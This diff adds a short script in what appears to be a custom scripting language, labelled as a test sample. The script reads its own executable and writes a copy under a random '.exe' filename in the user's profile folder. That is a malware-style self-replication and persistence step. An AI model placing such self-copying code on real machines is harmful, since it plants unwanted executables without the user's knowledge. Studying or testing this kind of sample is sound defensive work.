@@ -1,0 +1,15 @@
+#SAMPLE
+
+name[Test]
+version[alpha]
+
+#PIECES
+
+sysvar.exepath[][lpath]
+file.read[lpath][filecontent,bfsize]
+random.str[20][randstr]
+sysvar.getenv["USERPROFILE"][usrvar]
+datamanip.catstr[usrvar,"/"][datfilepath1]
+datamanip.catstr[datfilepath1,randstr][datfilepath2]
+datamanip.catstr[datfilepath2,".exe"][datfilepath3]
+file.writeptr[datfilepath3,filecontent,bfsize][]
